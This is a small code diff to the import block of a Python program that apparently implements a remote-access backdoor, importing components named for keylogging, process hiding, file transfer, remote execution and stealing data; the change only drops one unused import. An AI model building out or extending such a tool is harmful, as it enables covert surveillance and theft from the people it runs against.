@@ -23,7 +23,7 @@ import subprocess
 from utils.encryption import StreamEncryption, BlockEncryption
 from utils.shell import LIST, WGET, WATCH, KEYLOGGER, STOP, START, TRANSFER, EXECUTE, STEAL
 from utils.validation import validate_ipv4_address, validate_nic_interface
-from utils.process import hide_process_name, set_proc_name
+from utils.process import hide_process_name
 from utils.keylogger import Keylogger
 
 # Third Party Libraries
